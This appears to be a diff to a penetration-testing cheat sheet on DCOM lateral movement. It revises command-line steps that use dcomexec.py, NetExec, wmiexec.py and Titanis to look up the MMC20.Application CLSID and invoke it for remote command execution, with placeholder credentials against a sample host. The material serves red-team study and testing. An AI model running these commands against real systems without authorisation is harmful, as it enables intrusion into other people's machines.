@@ -175,10 +175,17 @@ dcomexec.py DOMAIN/jdoe:Password123@192.168.1.10 "whoami" -object ShellBrowserWi
 # NetExec
 netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomexec
 
-# Titanis — Step 1: look up CLSID on the remote system (ProgID resolution is local, not remote)
-Reg query 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
-  'HKLM\SOFTWARE\Classes\MMC20.Application\CLSID'
-# Step 2: invoke with the raw GUID from Step 1
+# Titanis — Step 1: look up CLSID on the remote system
+# Titanis Reg list cannot read unnamed (default) registry values — use wmiexec for this step
+wmiexec.py DOMAIN/jdoe:Password123@192.168.1.10 \
+  'reg query HKCR\\MMC20.Application\\CLSID /ve'
+# → (Default)    REG_SZ    {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
+
+# Step 2 (optional): inspect the CLSID entry on the remote system to confirm AppID/auth level
+Reg list 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+  'HKLM\SOFTWARE\Classes\CLSID\{49B2791A-B1AE-4C90-9B8E-E860BA07F889}'
+
+# Step 3: invoke with raw GUID
 # Note: exec method must be at the root IDispatch level — standard exec CLSIDs fail (multi-hop)
 Dcom invoke 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
   '{49B2791A-B1AE-4C90-9B8E-E860BA07F889}' MethodName arg1 arg2
